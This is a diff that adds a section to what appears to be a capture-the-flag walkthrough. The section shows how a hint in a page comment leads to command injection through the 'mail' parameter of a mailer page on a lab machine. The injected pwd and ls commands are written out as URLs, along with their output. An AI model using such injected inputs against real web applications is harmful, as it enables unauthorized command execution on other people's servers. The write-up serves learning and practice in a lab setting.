@@ -121,3 +121,28 @@ At "?page=mailer" I got some interesting results by looking at the page source:
     <!--Better finish implementing this so y4nd3r3_ro3
  can send me all his loser complaints!-->
 ```
+
+So, big ol' hint there to use `/?page=mailer&mail=mail wallaby "message goes here"` as a potentially sensitive URL format. 
+
+Do As I Say, Not As I Do
+-------------------------
+
+I try this URL, nothing much happens:
+
+http://192.168.x.x:60080/?page=mailer&mail=mail
+
+But then I start poking around...
+
+http://192.168.x.x:60080/?page=mailer&mail=pwd
+
+> /var/www/html
+> Coming Soon guys!
+
+A little more...
+
+http://192.168.x.x:60080/?page=mailer&mail=ls%20-lah
+
+> total 96K drwxr-xr-x 3 www-data www-data 4.0K Jan 3 07:41 . drwxr-xr-x 3 root root 4.0K Dec 16 21:31 .. -rw-r--r-- 1 root 
+> root 16K Aug 11 2015 eye.jpg -rw-r--r-- 1 root root 3.6K Dec 27 19:19 index.php drwxr-xr-x 2 root root 4.0K Dec 27 12:25 
+> s13!34g$3FVA5e@ed -rw-r--r-- 1 root root 57K Dec 27 12:24 sec.png -rw-r--r-- 1 www-data www-data 12 Jan 3 07:26 uname.txt
+> Coming Soon guys!
